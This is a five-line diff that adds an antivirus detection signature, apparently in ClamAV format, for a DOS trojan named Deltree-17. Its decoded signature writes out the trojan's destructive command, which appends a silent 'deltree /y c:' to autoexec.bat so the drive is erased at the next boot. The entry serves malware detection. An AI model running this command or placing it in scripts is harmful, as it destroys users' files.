@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Deltree-17
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@echo @deltree.exe /y c:>>c:\autoexec.bat>nul
